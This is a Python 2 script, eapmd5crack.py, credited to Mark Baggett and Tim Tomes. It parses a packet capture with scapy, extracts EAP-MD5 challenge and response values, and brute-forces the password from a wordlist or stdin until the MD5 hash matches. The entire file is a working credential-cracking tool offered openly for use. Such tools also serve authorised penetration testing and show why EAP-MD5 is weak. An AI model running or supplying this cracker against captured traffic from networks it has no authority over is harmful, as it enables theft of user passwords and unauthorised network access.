#!/usr/bin/python -tt

# eapmd5crack.py will crack a eap-md5 challenge response captured on the network
# By Mark Baggett & Tim Tomes (LaNMaSteR53) available for download at www.LaNMaSteR53.com

import md5, sys, time, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def md5sum(value):
  hasher = md5.new()
  hasher.update(value)
  return hasher.digest()

reqhash = {}
resphash = {}

if len(sys.argv) < 3:
  print """Syntax: python eapmd5crack.py /path/to/pcapfile.pcap /path/to/password.txt [-v]
  
  Example: 
  Read passwords from file -
  python eapmd5crack.py ./xtest-1.0/sample-pcaps/7961G-EAP_Success.pcap ./xtest-1.0/dict.txt
  
  Read passwords from stdin - 
  cat ./xtest-1.0/dict.txt | python eapmd5crack.py ./xtest-1.0/sample-pcaps/7961G-EAP_Success.pcap -"""
  sys.exit(2)

pcapfile = sys.argv[1]
passfile = sys.argv[2]
verbose = False
if len(sys.argv) > 3:
  if sys.argv[3] == '-v':
    verbose = True

if passfile == "-":
  pwfile=sys.stdin
else:
  pwfile=open(passfile,"r")

p=rdpcap(pcapfile)
wordcount = 0

for packets in p:
  if packets.haslayer(EAP):
    if packets[EAP].type==4:
      reqid=packets[EAP].id
      if packets[EAP].code == 1:
        reqhash[reqid]=packets[EAP].load[1:17]
        print "[-] Message ID(HEX): " + chr(reqid).encode("hex")
        print "[-] Challenge(MD5): " + reqhash[reqid].encode("hex").upper()
      if packets[EAP].code == 2:
        resphash[reqid]=packets[EAP].load[1:17]
        print "[-] Needed Response(MD5): " + resphash[reqid].encode("hex").upper()
        if raw_input("Would you like to crack Message ID '" + chr(reqid).encode("hex") + "' [Y/n]: ").upper() == "Y":
          cracked = False
          start = time.time()
          for line in pwfile:
            wordcount += 1
            currentpw = line.strip()
            if verbose: print "[+] Attempting password... " + currentpw
            if md5sum(chr(reqid) + currentpw + reqhash[reqid]) == resphash[reqid]:
              print "[-] Password found: " + currentpw
              cracked = True
              break
          stop = time.time()    
          if cracked == False: print "[-] Password not found."
          time = stop - start
          print "\nAttempted %d passwords in %.2f seconds. [%d p/s]" % (wordcount, time, round(wordcount/time, 2))
          sys.exit(2)
